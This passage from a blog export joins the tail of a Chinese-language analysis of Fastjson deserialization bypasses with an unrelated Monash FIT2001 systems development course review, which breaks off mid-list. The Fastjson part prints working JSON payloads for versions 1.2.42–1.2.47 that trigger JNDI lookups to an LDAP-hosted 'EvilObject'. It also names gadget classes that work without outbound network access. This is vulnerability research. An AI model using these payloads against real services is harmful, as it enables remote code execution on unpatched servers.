<h3 id="1-2-42绕过"><a href="#1-2-42绕过" class="headerlink" title="1.2.42绕过"></a>1.2.42绕过</h3><h4 id="方法一：以-开头-1"><a href="#方法一：以-开头-1" class="headerlink" title="方法一：以[开头"></a>方法一：以[开头</h4><p>新版本并未考虑到<code>[</code>开头的绕过方式，所以依旧可用：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> CannotCompileException, IOException, NotFoundException &#123;</span><br><span class="line">    ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);</span><br><span class="line">    String evilStr=<span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;[com.sun.rowset.JdbcRowSetImpl\&quot;[&#123;,\&quot;dataSourceName\&quot;:\&quot;ldap://127.0.0.1:7777/#EvilObject\&quot;,\&quot;autoCommit\&quot;:true&#125;&quot;</span>;</span><br><span class="line">    JSON.parseObject(evilStr,Object.class);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="方法二：以LL开头-结尾"><a href="#方法二：以LL开头-结尾" class="headerlink" title="方法二：以LL开头;;结尾"></a>方法二：以LL开头;;结尾</h4><p>绕过黑名单其实很简单，因为此处只对<code>L</code>和<code>;</code>做了一次检测，所以我们写两次就可以了。</p>
<p>POC如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> CannotCompileException, IOException, NotFoundException &#123;</span><br><span class="line">    ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);</span><br><span class="line">  </span><br><span class="line">    String evilStr=<span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;LLcom.sun.rowset.JdbcRowSetImpl;;\&quot;,\&quot;dataSourceName\&quot;:\&quot;ldap://127.0.0.1:7777/#EvilObject\&quot;,\&quot;autoCommit\&quot;:true&#125;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    JSON.parseObject(evilStr,Object.class);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>计算器成功弹出：</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220110134359041.png" alt="image-20220110134359041"></p>
<h3 id="1-2-43版本变化及绕过"><a href="#1-2-43版本变化及绕过" class="headerlink" title="1.2.43版本变化及绕过"></a>1.2.43版本变化及绕过</h3><p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220110134617419.png" alt="image-20220110134617419"></p>
<p>这里对复写LL;;的方式也做了检测，因此不能再使用这种方式绕过了。</p>
<p>但以<code>[</code>开头的方式依然可以绕过</p>
<p><strong>POC:</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> CannotCompileException, IOException, NotFoundException &#123;</span><br><span class="line">    ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);</span><br><span class="line">    String evilStr=<span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;[com.sun.rowset.JdbcRowSetImpl\&quot;[&#123;,\&quot;dataSourceName\&quot;:\&quot;ldap://127.0.0.1:7777/#EvilObject\&quot;,\&quot;autoCommit\&quot;:true&#125;&quot;</span>;</span><br><span class="line">    JSON.parseObject(evilStr,Object.class);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="1-2-44版本变化"><a href="#1-2-44版本变化" class="headerlink" title="1.2.44版本变化"></a>1.2.44版本变化</h3><p>在checkAutoType中对<code>[</code>开头的classname也做了检测，因此我们之前的方法失效。</p>
<p>这里找出了新的利用链，且并不在黑名单中：但必须要有需要有第三方组件<strong>ibatis-core 3:0</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> CannotCompileException, IOException, NotFoundException &#123;</span><br><span class="line">    ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);</span><br><span class="line">    </span><br><span class="line">    String evilStr= <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\&quot;,\&quot;properties\&quot;:&#123;\&quot;data_source\&quot;:\&quot;ldap://localhost:7777/#EvilObject\&quot;&#125;&#125;&quot;</span>;</span><br><span class="line">    JSON.parseObject(evilStr,Object.class);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="1-2-25-1-2-47通杀"><a href="#1-2-25-1-2-47通杀" class="headerlink" title="1.2.25 - 1.2.47通杀"></a>1.2.25 - 1.2.47通杀</h3><p>这里不再调试了，大概就是不停的绕过。</p>
<p>fastjon中有一个判断，如果发现是Class类型，那么就会执行<code>com.alibaba.fastjson.util.TypeUtils#loadClass</code>，loadClass()中先通过java.lang.Class绕过了黑名单检测，并将该Class添加到了mapping中（会判断cache是否为true，默认为true），从而绕过了autoType中的检测。</p>
<blockquote>
<ul>
<li>1.2.25-1.2.32版本：未开启AutoTypeSupport时能成功利用，开启AutoTypeSupport不能利用</li>
<li>1.2.33-1.2.47版本：无论是否开启AutoTypeSupport，都能成功利用</li>
</ul>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;a&quot;</span>:&#123;</span><br><span class="line">        <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.Class&quot;</span>,</span><br><span class="line">        <span class="string">&quot;val&quot;</span>:<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">&quot;b&quot;</span>:&#123;</span><br><span class="line">        <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,</span><br><span class="line">        <span class="string">&quot;dataSourceName&quot;</span>:<span class="string">&quot;ldap://localhost:1389/badNameClass&quot;</span>,</span><br><span class="line">        <span class="string">&quot;autoCommit&quot;</span>:<span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="1-2-48版本变化"><a href="#1-2-48版本变化" class="headerlink" title="1.2.48版本变化"></a>1.2.48版本变化</h3><p>将默认cache设为了false，就无法将class放入mapping了。</p>
<h2 id="Fastjson不出网利用"><a href="#Fastjson不出网利用" class="headerlink" title="Fastjson不出网利用"></a>Fastjson不出网利用</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl<span class="comment">//feature需要设为允许给非public属性赋值</span></span><br><span class="line">    </span><br><span class="line">org.apache.tomcat.dbcp.dbcp2.BasicDataSource<span class="comment">//需要dbcp或者tomcat-dbcp的依赖即可（dbcp是数据库连接池）</span></span><br></pre></td></tr></table></figure>

<p>dbcp链暂时放在之后再分析。</p>
<h2 id="Reference-8"><a href="#Reference-8" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://www.yuque.com/tianxiadamutou/zcfd4v/xehnw7">Fastjson JdbcRowSetImpl 链及后续漏洞分析</a></p>
<p><a href="https://xz.aliyun.com/t/8979#toc-0">Fastjson 1.2.22-1.2.24反序列化漏洞分析</a></p>
<p><a href="https://yyz9.cn/2021/08/07/fastjson%E5%90%84%E4%B8%AA%E7%89%88%E6%9C%AC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">fastjson各个版本反序列化漏洞分析</a></p>
]]></content>
      <categories>
        <category>Web Security</category>
        <category>Java Deserialization</category>
      </categories>
      <tags>
        <tag>Web Security</tag>
        <tag>Java Deserialization</tag>
      </tags>
  </entry>
  <entry>
    <title>Systems Development Course Review</title>
    <url>/2021/06/04/Systems-Development-Course-Review/</url>
    <content><![CDATA[<p><strong>This note is for the course from Monash University - FIT2001.</strong></p>
<h2 id="S1-Nature-of-Systems-Development"><a href="#S1-Nature-of-Systems-Development" class="headerlink" title="S1: Nature of Systems Development"></a>S1: Nature of Systems Development</h2><h3 id="Information-systems"><a href="#Information-systems" class="headerlink" title="Information systems"></a>Information systems</h3><h4 id="What-are-the-information-systems"><a href="#What-are-the-information-systems" class="headerlink" title="What are the information systems?"></a>What are the information systems?</h4><span id="more"></span>

<h5 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h5><p>Information systems: <strong>a integrated set of components</strong> for <strong>collecting, storing, and processing data and for delivering information</strong>.</p>
<p>The main components of an information systems are - <strong>people, procedures, hardware, software, databases, data warehouses and telecommunications</strong>.</p>
<h5 id="Sample-question"><a href="#Sample-question" class="headerlink" title="Sample question"></a>Sample question</h5><p>Briefly discuss why the Student Enrolment system is an information system and, describe its key components.</p>
<p>A: </p>
<ul>
<li><p><strong>Reason</strong>:</p>
<p><strong>Collecting</strong>: collect students’ enrolment data, </p>
<p><strong>Storing</strong>:  store the students’ enrolment data</p>
<p><strong>Processing</strong>: to know whether you are on track on complete that course. </p>
<p><strong>Delivering</strong>: give a list of classes / lecturer could see who enrolled his/her course.</p>
</li>
<li><p><strong>Key components:</strong></p>
<p><strong>people</strong>: adamic stuff -&gt; put the courses in the system</p>
<p><strong>procedures</strong>: students input data into the system and the data will be check if valid? If the chosen unit matches students’ major field?</p>
<p><strong>hardware</strong>: laptop, PC, printers, screens…</p>
<p><strong>software</strong>: written programs, OS</p>
<p><strong>databases</strong>: student information will be stored in the databases.</p>
<p><strong>telecommunications</strong>: network</p>
</li>
</ul>
<h3 id="Systems-Development-Life-Cycle-SDLC"><a href="#Systems-Development-Life-Cycle-SDLC" class="headerlink" title="Systems Development Life Cycle(SDLC)"></a>Systems Development Life Cycle(SDLC)</h3><h4 id="Phases-in-the-SDLC-Key-activities-IADI"><a href="#Phases-in-the-SDLC-Key-activities-IADI" class="headerlink" title="Phases in the SDLC - Key activities(IADI)"></a>Phases in the SDLC - Key activities(IADI)</h4><h5 id="phase-1-Initiation"><a href="#phase-1-Initiation" class="headerlink" title="phase 1: Initiation"></a>phase 1: Initiation</h5><h6 id="key-activities"><a href="#key-activities" class="headerlink" title="key activities"></a>key activities</h6><ul>
<li><p>Review and priorities project requests</p>
</li>
<li><p>Assess project feasibility</p>
</li>
<li><p>Develop the project plan</p>
</li>
</ul>
<h5 id="phase-2-Analysis"><a href="#phase-2-Analysis" class="headerlink" title="phase 2: Analysis"></a>phase 2: Analysis</h5><h6 id="key-activities-1"><a href="#key-activities-1" class="headerlink" title="key activities"></a>key activities</h6><ul>
<li>Determine detailed user requirements.</li>
<li>Create system models to confirm requirements and for design.</li>
<li>Perform <em>Build vs Buy</em> analysis.</li>
</ul>
<h5 id="phase-3-Design"><a href="#phase-3-Design" class="headerlink" title="phase 3: Design"></a>phase 3: Design</h5><h6 id="key-activities-2"><a href="#key-activities-2" class="headerlink" title="key activities"></a>key activities</h6><ul>
<li>Define technical architecture.</li>
<li>Produce technical specs.</li>
<li>Create database.</li>
</ul>
<h5 id="phase-4-Implementation"><a href="#phase-4-Implementation" class="headerlink" title="phase 4: Implementation"></a>phase 4: Implementation</h5><h6 id="key-activities-3"><a href="#key-activities-3" class="headerlink" title="key activities"></a>key activities</h6><ul>
<li>Build, Test, Validate.</li>
<li>Conduct Integration, System and Acceptance testing.</li>
<li>Create User Docs, Train users.</li>
<li>Install, Deploy new system.</li>
</ul>
<h5 id="phase-5-Support"><a href="#phase-5-Support" class="headerlink" title="phase 5: Support"></a>phase 5: Support</h5><ul>
<li>Conduct post-implementation system review</li>
<li>Identify errors and enhancements</li>
<li>Monitor system performance</li>
</ul>
<h4 id="Sample-Question"><a href="#Sample-Question" class="headerlink" title="Sample Question"></a>Sample Question</h4><p>You are chatting with a friend about your job as an IT Developer, and they ask for a brief description on how IT systems are developed. Briefly describe the <strong>key phases of IT systems development, and the importance of each phase in the development process</strong>. (Seminar 1)</p>
<p>A: </p>
<ul>
<li><strong>Initiation</strong>: <ul>
<li>assess whether project is feasible.</li>
<li>whether you can build the system on time within the budget.</li>
<li>Is the expertise available?</li>
<li><strong>Importance</strong>: It determines whether you can go ahead or not, otherwise you waste your money.</li>
</ul>
</li>
<li><strong>Analysis</strong><ul>
<li>Determine detailed user requirements.</li>
<li>Create system models to confirm requirements and for design.</li>
<li>Perform <em>Build vs Buy</em> analysis.</li>
<li><strong>Importance</strong>: it is vital that you demonstrate to the client that you understand their requirements otherwise you can’t build the system they want to pay for.</li>
</ul>
</li>
<li><strong>Design</strong><ul>
<li>Define technical architecture.</li>
<li>Produce technical specs. Interface Design/ prototypes/ Security/ network</li>
<li>Create database.</li>
<li><strong>Importance</strong>: easy to maintain</li>
</ul>
</li>
<li><strong>Implementation</strong><ul>
<li>Build, Test, Validate if the system works.</li>
<li>Conduct Integration, System and Acceptance testing.</li>
<li>Create User Docs, Train users.</li>
<li>Install, Deploy new system.</li>
<li><strong>Importance</strong>: developers know what they’re building and users know that they are using. users need to know how to use the system. </li>
</ul>
</li>
<li><strong>Support</strong><ul>
<li>post-implementation review</li>
<li>Ready to fix errors, handle the system.</li>
<li><strong>Importance</strong>: be able to handle the system, you can get benefit and opportunity to reflect and learn.</li>
</ul>
</li>
</ul>
<h3 id="System-developers-Critical-skills-for-every-role"><a href="#System-developers-Critical-skills-for-every-role" class="headerlink" title="System developers - Critical skills for every role"></a>System developers - Critical skills for every role</h3><h4 id="Introduction-1"><a href="#Introduction-1" class="headerlink" title="Introduction"></a>Introduction</h4><ul>
<li><strong>Understanding business</strong> - awareness and sensitivity to the business processes<br>and needs that require technology in the first place</li>
<li><strong>Broad and up-to-date understanding of technology</strong> – can be invaluable in<br>creating the ‘best’ solutions for the organization</li>
<li><strong>Multiple Perspectives</strong> - The ability to understand that there are multiple<br>perspectives to solving a problems is required to find the best solution</li>
<li><strong>People/Soft Skills</strong> - the ability to interact with other people and to be a part of a<br>team</li>
<li><strong>Continuous Learning</strong> – essential in a high-change industry, like IT</li>
</ul>
<h4 id="Sample-Question-1"><a href="#Sample-Question-1" class="headerlink" title="Sample Question"></a>Sample Question</h4><p>You are attending a job interview as a System Developer. What skills are you going to showcase in your interview? (Seminar 1)</p>
<h2 id="S2-System-Development-Approaches-Agile-Software-Development-Stakeholder-management"><a href="#S2-System-Development-Approaches-Agile-Software-Development-Stakeholder-management" class="headerlink" title="S2: System Development Approaches, Agile Software Development, Stakeholder management"></a>S2: System Development Approaches, Agile Software Development, Stakeholder management</h2><h3 id="Approaches"><a href="#Approaches" class="headerlink" title="Approaches"></a>Approaches</h3><ul>
<li><p>predictive</p>
<ul>
<li>requirements -&gt; well understood&amp;defined</li>
<li>low tech risk</li>
</ul>
</li>
<li><p>adaptive</p>
<ul>
<li>requirements&amp;needs-&gt;uncertain</li>
<li>high tech risk</li>
</ul>
</li>
</ul>
<h3 id="Waterfall"><a href="#Waterfall" class="headerlink" title="Waterfall"></a>Waterfall</h3><ul>
<li>sequential stages(no overlap and iteration)</li>
<li>strong emphasis on planning and specification development</li>
<li>works well for clearly defined projects</li>
</ul>
<h3 id="Aglie"><a href="#Aglie" class="headerlink" title="Aglie"></a>Aglie</h3><ul>
<li><p>value(RVVV)<br>CP/IPT/WCD/CCCN</p>
<ul>
<li>responding to change over following a plan</li>
<li>value interactions and individuals over process and tools </li>
<li>value working software over comprehensive documentation</li>
<li>value costumer collaboration over contact negotiation </li>
</ul>
</li>
<li><p>12 Principles</p>
<ul>
<li>software is the primary goal</li>
<li>next effort is the secondary goal</li>
<li>…</li>
</ul>
</li>
<li><p>SCRUM(Agile frameworks) artifact</p>
<ul>
<li><p>product backlog</p>
<ul>
<li>the single source of requirements</li>
<li>cumulative list of the desired deliverable for the project - every feature, enhancement, bug fix, documentation requirement, every bit of work required by the team</li>
<li>prioritised to maximise value</li>
</ul>
</li>
<li><p>sprint backlog</p>
<ul>
<li>a list of tasks the team must complete to deliver an increment of functional software at the end of each Sprint</li>
<li>Once decided Team owns the Sprint Backlog - only they can decide on scope change.</li>
</ul>
</li>
<li><p>sprint burndown charts</p>
<ul>
<li>shows the total estimated work remaining for the entire forecasted sprint backlog against time</li>
</ul>
</li>
<li><p>task board</p>
<ul>
<li>allows visibility and transparency across the project</li>
<li>display the live status of team work and focus</li>
<li>Most have - Backlog, to-do, doing and done status</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="stakeholder-management"><a href="#stakeholder-management" class="headerlink" title="stakeholder management"></a>stakeholder management</h3><ul>
<li><p>define</p>
<ul>
<li><p>internal stakeholders</p>
<ul>
<li>within the organisation</li>
</ul>
</li>
<li><p>external stakeholders</p>
<ul>
<li>outside the organization</li>
</ul>
</li>
<li><p>operational stakeholders</p>
<ul>
<li>regularly interact with the system</li>
</ul>
</li>
<li><p>executive stakeholders</p>
<ul>
<li>don’t interact directly but use the information or have a financial interest </li>
</ul>
</li>
</ul>
</li>
<li><p>**prioritise and understand your stakeholders</p>
<p>- </p>
</li>
</ul>
<h2 id="S3-Investigating-System-Requirements-Information-Gathering-Techniques"><a href="#S3-Investigating-System-Requirements-Information-Gathering-Techniques" class="headerlink" title="S3: Investigating System Requirements/ Information Gathering Techniques"></a>S3: Investigating System Requirements/ Information Gathering Techniques</h2><h3 id="requirements-gathering"><a href="#requirements-gathering" class="headerlink" title="requirements gathering"></a>requirements gathering</h3><ul>
<li>investigating requirements using a range of techniques</li>
<li>developing a deep understanding of the business domain</li>
<li>defining what the solution needs to be to meet the requirements</li>
<li>requirements must be verified by the client</li>
</ul>
<h3 id="requirements"><a href="#requirements" class="headerlink" title="requirements"></a>requirements</h3><ul>
<li><p>functional requirements</p>
<ul>
<li>represents the activities a software system must perform</li>
<li>business functions that end-users carry out </li>
<li>expressed in terms of models</li>
</ul>
</li>
<li><p>non-functional requirements</p>
<ul>
<li>represents other characteristics from a software system </li>
<li>like constraints</li>
<li>performance goals(speed)</li>
</ul>
</li>
</ul>
<h3 id="information-gathering-techniques"><a href="#information-gathering-techniques" class="headerlink" title="information gathering techniques"></a>information gathering techniques</h3><ul>
<li><p>Interviewing users and stakeholders</p>
<ul>
<li><p>efficient way but time-consuming</p>
</li>
<li><p>how to prapre</p>
<ul>
<li><p>set clear objectives &amp; what information is needed</p>
</li>
<li><p>select appropriate stakeholders to interview</p>
</li>
<li><p>determine one-on-one/group interview</p>
</li>
<li><p>consider outside information - reports, forms, etc</p>
</li>
<li><p>review related documents and develop an agenda</p>
</li>
<li><p>documents objectives, nothing forgotten, logical progression</p>
</li>
<li><p>avoid long interviews - stakeholder do not have much time/ choose several shorter interviews</p>
</li>
<li><p>planning- interviewees has been sent Location, time, objectives &amp; list of questions</p>
</li>
<li><p>send reminders</p>
</li>
<li><p>arrive early</p>
</li>
<li><p>room is prepared for the interview</p>
</li>
<li><p>decide on a documentation method(get permission)</p>
<ul>
<li>take notes</li>
<li>video taped</li>
<li>recording</li>
</ul>
</li>
<li><p>follow up as needed - in future meetings or interviews</p>
</li>
</ul>
</li>
</ul>
</li>
<li><p>distributing and collecting questionnaires</p>
<ul>
<li><p>online, paper-based or email</p>
</li>
<li><p>advantages</p>
<ul>
<li>cover a wide spectrum of people</li>
<li>faster responses</li>
<li>low costs of distribution</li>
<li>good when people are widely dispersed</li>
<li>can give a preliminary insight into business </li>
</ul>
</li>
<li><p>disadvantages</p>
<ul>
<li>low response rate - not many people are willing to respond</li>
<li>not well for gathering the detailed information</li>
</ul>
</li>
</ul>
</li>
<li><p>Reviewing existing reports, forms and procedure descriptions</p>
<ul>
<li><p>existing business documents and procedures within organisation </p>
<ul>
<li>obtain preliminary understanding of precess </li>
<li>identify business rules, discrepancies, redundancies</li>
<li>be cautious of outdated material</li>
<li>can help guide interviews</li>
</ul>
</li>
</ul>
</li>
<li><p>Observation</p>
<ul>
<li><p>avoid hawthorne effect</p>
<ul>
<li><p>also referred to as the observer effect refers to a phenomenon, whereby workers :</p>
<ul>
<li>improve or modify an aspect of their behaviours/activities</li>
<li>or STOP WORKING in response to the fact that they are being observed</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li><p>Researching vendor solution</p>
<ul>
<li><p>many problems have been solved by other companies - have a look around for good ideas</p>
</li>
<li><p>positive contributions of vendor solutions</p>
<ul>
<li>frequently provide new ideas</li>
<li>may be the state of the art</li>
<li>cheaper and less risky</li>
</ul>
</li>
<li><p>danger</p>
<ul>
<li>may need to purchase solution before understanding problem</li>
<li>vendor support may not be there in the future</li>
<li>upgrade issues</li>
<li>may not address all business requirements</li>
</ul>
</li>
</ul>
</li>
<li><p>Prototyping</p>
</li>
<li><p>story-writing workshops</p>
</li>
</ul>
<h3 id="Investigating-documenting-system-requirements"><a href="#Investigating-documenting-system-requirements" class="headerlink" title="Investigating/documenting system requirements"></a>Investigating/documenting system requirements</h3><p>User Stories, Activity diagrams</p>
<ul>
<li><p>Models</p>
<ul>
<li><p>why do we use them?</p>
<ul>
<li><p>The model serves as an abstraction - an approximate representation of the real item</p>
</li>
<li><p>A simplified picture of complex reality</p>
</li>
<li><p>Reasons/advantages for modelling in system analysis </p>
<ul>
<li>reducing complexity of systems to be built by abstraction</li>
<li>communication with other development team members</li>
<li>communication with stakeholders/users</li>
<li>learning from the model process</li>
<li>documenting all the detailed of requirements for future maintenance/enhancement - represents some key aspects of the system being built</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li><p>User stories</p>
<ul>
<li><p>define - what are they?</p>
<ul>
<li>short, simple description of a product feature - told from the perspective of the user who wants that feature</li>
<li>They go into product backlog</li>
</ul>
</li>
<li><p>reason - why User Stories</p>
<ul>
<li>encourages user communication and collaboration and real-time feedback</li>
<li>focus on end user value</li>
<li>planning is simplified - if it’s too big, you can’t estimate it</li>
<li>avoids locking in design detail too early - focus on WHAT - leaves the technical aspects to the developers, testers, etc.</li>
<li>Users do not need to be trained to understand User Stories</li>
<li>never out of date, just in time</li>
<li>eliminates weighty documentation - create what you need to deliver the story</li>
<li>easier to communicate with users</li>
</ul>
</li>
<li><p>how do you write</p>
<ul>
<li>As xxxx I want xxxxxx so that xxx</li>
<li>exam included</li>
</ul>
</li>
<li><p>good stories?(INVEST)</p>
<ul>
<li><p>independent</p>
<ul>
<li>not depend on other stories</li>
</ul>
</li>
<li><p>negotiable</p>
<ul>
<li>leave room for negotiation</li>
</ul>
</li>
<li><p>valuable</p>
<ul>
<li>gives value to the customer</li>
</ul>
</li>
<li><p>estimable</p>
<ul>
<li>should have enough information to be estimated</li>
</ul>
</li>
<li><p>small</p>
<ul>
<li>small enough to fit within a sprint</li>
</ul>
</li>
<li><p>Testable</p>
<ul>
<li>includes acceptance criteria to test that customer needs met.</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li><p>Activity diagrams</p>
<ul>
<li><p>define</p>
<ul>
<li><p>a technique to describe a procedural logic, business process, and workflow.</p>
</li>
<li><p>describes</p>
<ul>
<li>user activities</li>
<li>the person who does each activity</li>
<li>the sequence of activities</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="S5-Use-Case-Diagrams"><a href="#S5-Use-Case-Diagrams" class="headerlink" title="S5: Use Case Diagrams"></a>S5: Use Case Diagrams</h2><h3 id="Use-Case-Diagram"><a href="#Use-Case-Diagram" class="headerlink" title="Use Case Diagram"></a>Use Case Diagram</h3><ul>
<li><p>Actor</p>
<ul>
<li><p>Primary Actor</p>
<ul>
<li>using the system to achieve a goal</li>
</ul>
</li>
<li><p>Secondary Actor</p>
<ul>
<li>The system needs assistance to achieve the primary actor’s goal(s)</li>
</ul>
</li>
<li><p>generalisation</p>
<ul>
<li>inherits the behaviours of its parents and adds new behaviours</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="Use-Case-Description"><a href="#Use-Case-Description" class="headerlink" title="Use Case Description"></a>Use Case Description</h3><ul>
<li>Identify the Actors</li>
<li>identify the goal</li>
<li>identify the pre-conditions</li>
<li>define the Post-conditions</li>
<li>describe Main Flows</li>
<li>describe Alternative Flows</li>
</ul>
<h2 id="S6-Domain-Class-Modelling"><a href="#S6-Domain-Class-Modelling" class="headerlink" title="S6: Domain Class Modelling"></a>S6: Domain Class Modelling</h2><h3 id="be-able-to-draw"><a href="#be-able-to-draw" class="headerlink" title="be able to draw"></a>be able to draw</h3><h2 id="S7-Prototyping"><a href="#S7-Prototyping" class="headerlink" title="S7: Prototyping"></a>S7: Prototyping</h2><p>Usability of systems</p>
<h3 id="Prototyping"><a href="#Prototyping" class="headerlink" title="Prototyping"></a>Prototyping</h3><ul>
<li><p>Definition of Prototyping</p>
<ul>
<li>a process of quickly mocking up the future system functionality</li>
<li>use visuals to describe how a system should behave and look</li>
<li>can be horizontal or vertical</li>
<li>can be experimental or evolutionary</li>
</ul>
</li>
<li><p>Advantage of Prototyping</p>
<ul>
<li>explore the idea before you invest in them(improve communication, reduce risk)</li>
<li>saves time and money</li>
<li>proof of concept</li>
<li>technical and design exploration</li>
</ul>
</li>
<li><p>Disadvantage of Prototyping</p>
<ul>
<li>make the users think the system is developed</li>
<li>create a system that does not scale</li>
<li>Waste time(as developers spend much time making throw away prototypes looks good)</li>
</ul>
</li>
</ul>
<h3 id="Usability"><a href="#Usability" class="headerlink" title="Usability"></a>Usability</h3><ul>
<li><p>Definition</p>
<ul>
<li><p>the extent to which a product can be used by specified users to achieve specified goals with effectiveness, efficiency, and satisfaction</p>
<ul>
<li>Effectiveness: accuracy and completeness</li>
<li>Efficiency: resources expended in relation to effectiveness</li>
<li>Satisfaction: the comfort and acceptability of the work system to its users.</li>
</ul>
</li>
</ul>
</li>
<li><p>why is it important</p>
<ul>
<li>help improve user effciency</li>
<li>can make users feel more in control</li>
<li>help improve sales of products</li>
<li>help improve usage of the system</li>
<li>can improve user satisfication</li>
</ul>
</li>
<li><p>usability of an interface design<br>evaluating usability</p>
<ul>
<li>Learnability: how easy is it for users to accomplish basic tasks at the first time?</li>
<li>Efficiency: once users learned the design, how quickly they can perform the task</li>
<li>Memorability: When users return to the design after of a period of not using it, how easily they can re-establish proficiency</li>
<li>Errors: how many errors do users make?how severe are these errors? How easily can they recover from the errors?</li>
<li>Satisfaction: how pleasant is it to use the design</li>
</ul>
</li>
<li><p>type of usability of evaluation</p>
<ul>
<li><p>formative evaluation</p>
<ul>
<li>Users experience prototypes and identify usability problems </li>
<li>Evaluation by HCI expert </li>
</ul>
</li>
<li><p>Summative evaluation</p>
<ul>
<li>takes place post development</li>
<li>quantitive results collected</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="S8-Interface-Design-Guidelines-and-tips"><a href="#S8-Interface-Design-Guidelines-and-tips" class="headerlink" title="S8: Interface Design Guidelines and tips"></a>S8: Interface Design Guidelines and tips</h2><h3 id="guidlines"><a href="#guidlines" class="headerlink" title="guidlines"></a>guidlines</h3><ul>
<li><p>Ben Shneiderman’s 8 Golden rules</p>
<ul>
<li>Ben Shneiderman’s 8 Golden rules</li>
</ul>
</li>
<li><p>Jakob Nielsen’s 10 heuristics</p>
</li>
<li><p>Don Norman’s Guidlines</p>
</li>
</ul>
<h3 id="personas"><a href="#personas" class="headerlink" title="personas"></a>personas</h3><ul>
<li><p>why important</p>
<ul>
<li><p>Build Empathy</p>
<ul>
<li>Help users seem more real - designers empathise and build for their users</li>
</ul>
</li>
<li><p>Provide direction for making design decisions</p>
<ul>
<li>help focus design decision on users</li>
</ul>
</li>
<li><p>communicate Research Finding</p>
<ul>
<li>Team on the same page communicate the information in an easy to understand format</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="S9-Use-Case-Realisation"><a href="#S9-Use-Case-Realisation" class="headerlink" title="S9: Use Case Realisation"></a>S9: Use Case Realisation</h2><h3 id="Quality-of-design-models"><a href="#Quality-of-design-models" class="headerlink" title="Quality of design models"></a>Quality of design models</h3><ul>
<li><p>cohesion measures the consistency of functions in a class</p>
<ul>
<li><p>a single focus of class</p>
</li>
<li><p>a single focus of the methods in a class</p>
</li>
<li><p>no methods with multiple functions</p>
</li>
<li><p>low cohesion(Tight)</p>
<ul>
<li>hard to maintain</li>
<li>hard to reuse</li>
<li>hard to understand</li>
</ul>
</li>
</ul>
</li>
<li><p>coupling</p>
<ul>
<li><p>Qualitative measure of how closely classes are linked. </p>
</li>
<li><p>low or loos coupling make system easier to understand and maintain, minimal ripple effort</p>
</li>
<li><p>Tight coupling often leads to low cohesion</p>
<ul>
<li>increase the extent to which objects are independent</li>
<li>can causes ripple trough effects</li>
<li>reduces the ability to reuse parts of the system</li>
<li>hard to maintain</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="Design-Class-Diagram"><a href="#Design-Class-Diagram" class="headerlink" title="Design Class Diagram"></a>Design Class Diagram</h3><ul>
<li>design and document the programming classes that will be built for the new system</li>
<li>shows set of problem domain classes and their association relationships</li>
</ul>
<h2 id="S10-Security-amp-Testing"><a href="#S10-Security-amp-Testing" class="headerlink" title="S10: Security &amp; Testing"></a>S10: Security &amp; Testing</h2><h3 id="Testing"><a href="#Testing" class="headerlink" title="Testing"></a>Testing</h3><ul>
<li><p>definition</p>
<ul>
<li><p>represents the process of examining a component, subsystem, or system to: </p>
<ul>
<li>if it determines any defect</li>
<li>uncover design flows and limitations</li>
<li>verify that it is “fits for purpose” and meets the needs of the Business/End User</li>
<li>reduce the risk of failure</li>
</ul>
</li>
</ul>
</li>
<li><p>Testing process in different development approaches</p>
<ul>
